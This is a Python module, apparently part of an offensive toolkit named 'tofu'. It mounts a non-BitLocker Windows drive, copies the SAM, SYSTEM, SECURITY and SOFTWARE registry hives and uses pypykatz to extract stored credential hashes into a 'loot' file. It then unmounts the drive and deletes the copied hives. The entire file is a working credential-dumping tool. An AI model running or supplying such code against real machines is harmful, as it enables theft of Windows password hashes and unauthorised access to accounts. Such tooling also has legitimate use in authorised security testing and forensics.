from pypykatz.registry.offline_parser import OffineRegistry
import os
import subprocess
import shutil
import time
def __main__(drive_name,drive_format):
	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
		print("[-] This module does not work with a Bitlocker drive")
	elif drive_name == None:
		print("[-] This module needs a drive to work; use 'usedrive'")
	else:
		if not os.path.exists("tofu_tmp/windows_filesystem"):
			os.mkdir("tofu_tmp/windows_filesystem")
		else:
			try:
				# quick clean up incase another script forgot to unmount the filesystem
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
			except:
				pass
		print("[#] Preparing hashdump file at 'tofu_loot/pypykatz_hashdump.txt'")
		try:
			open("tofu_loot/pypykatz_hashdump.txt",'x').close()
		except FileExistsError:
			pass

		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
		print("[#] Copying files; this might take a while")
		try:
			print("[#] Copying SYSTEM hive")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SYSTEM","tofu_tmp/HASHDUMP_SYSTEM")
			print("[#] Copying SAM hive")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SAM","tofu_tmp/HASHDUMP_SAM")
			print("[#] Copying SECURITY hive")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SECURITY","tofu_tmp/HASHDUMP_SECURITY")
			print("[#] Copying SOFTWARE hive")
			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SOFTWARE","tofu_tmp/HASHDUMP_SOFTWARE")
			print("[#] Parsing")
			hashdump = OffineRegistry.from_files("tofu_tmp/HASHDUMP_SYSTEM", "tofu_tmp/HASHDUMP_SAM", "tofu_tmp/HASHDUMP_SECURITY", "tofu_tmp/HASHDUMP_SOFTWARE")
			print(hashdump)
			with open("tofu_loot/pypykatz_hashdump.txt",'a') as f:
				f.write(str(hashdump))
				 
			
			time.sleep(2)
			try:
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
				print("[+] Successfully unmounted")
			except Exception as unmount_error:
				print(f"Error Unmounting : {unmount_error}")
			
		
			try:
				os.remove("tofu_tmp/HASHDUMP_SYSTEM")
				os.remove("tofu_tmp/HASHDUMP_SAM")
				os.remove("tofu_tmp/HASHDUMP_SECURITY")
				os.remove("tofu_tmp/HASHDUMP_SOFTWARE")
			except Exception as delete_error:
				print(f"[-] Error while deleting temporary files : {delete_error}")			
			print("[+] Hashdump saved to 'tofu_loot/pypykatz_hashdump.txt'")
		except Exception as open_error:
			print(f"[-] Error {open_error}")

